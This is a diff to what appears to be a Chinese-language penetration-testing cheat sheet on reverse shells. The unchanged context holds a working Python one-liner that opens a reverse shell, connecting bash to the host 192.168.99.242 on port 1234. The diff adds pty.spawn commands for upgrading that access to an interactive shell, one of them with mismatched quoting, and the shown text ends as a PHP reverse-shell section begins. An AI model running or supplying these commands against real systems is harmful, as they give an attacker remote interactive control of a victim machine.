@@ -56,6 +56,16 @@ tcp:192.168.99.242:1234
 python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.99.242',1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
 ```
 
+**交互式shell**
+
+```python
+python -c 'import pty;pty.spawn('/bin/bash')'    
+```
+
+```python3
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+
 ### PHP反弹
 
 ```php
